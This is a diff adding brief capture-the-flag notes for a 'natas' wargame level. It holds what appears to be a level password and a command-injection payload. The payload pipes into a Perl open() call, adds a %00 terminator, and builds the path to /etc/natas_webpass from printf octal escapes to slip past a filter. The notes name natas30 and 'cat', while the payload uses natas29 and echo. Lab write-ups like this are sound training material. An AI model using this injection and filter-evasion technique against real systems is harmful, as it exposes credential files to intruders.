@@ -1,0 +1,8 @@
+airooCaiseiyee8he8xongien9euhe8b
+[the url parameter 'file' seems to be an argument to an openfile() call in a perl script]
+[googling reveals that openfile() is vulnerable to bash command injection]
+[further googling reveals that terminating the string with a %00 prevents errors]
+[but the word 'natas' and forward slashes are being filtered]
+[one can have bash transform octal codes into characters]
+[so cat /etc/natas_webpass/natas30 can be written as]
+|echo $(printf '%b' '\057')'etc'$(printf '%b' '\057')$(printf '%b' '\156')'atas_webpass'$(printf '%b' '\057')$(printf '%b' '\156')'atas29'%00
